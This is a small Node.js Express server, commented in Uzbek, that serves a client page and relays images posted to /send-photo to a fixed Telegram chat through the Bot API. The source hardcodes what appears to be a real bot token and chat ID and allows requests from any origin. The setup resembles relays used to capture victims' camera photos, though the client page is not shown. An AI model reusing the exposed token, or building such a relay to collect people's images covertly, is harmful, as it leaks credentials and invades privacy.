const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const cors = require('cors'); // 🆕 YANGI
require('dotenv').config();



const app = express();

const BOT_TOKEN = '7587178192:AAGxmUnjNYGx0rvoLlGqH9sZ_l6O9AKElbI';
const CHAT_ID = '7086429203';

// CORS muammosini hal qiladi
app.use(cors()); // 🆕 YANGI

// JSON va static fayllar uchun
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'client.html'));
});

app.post('/send-photo', async (req, res) => {
  try {
    const image = req.body.image;
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      chat_id: CHAT_ID,
      photo: image
    });
    res.sendStatus(200);
  } catch (err) {
    console.error('Xatolik:', err.message);
    res.sendStatus(500);
  }
});

app.listen(3000, () => {
  console.log('✅ Server ishga tushdi');
});
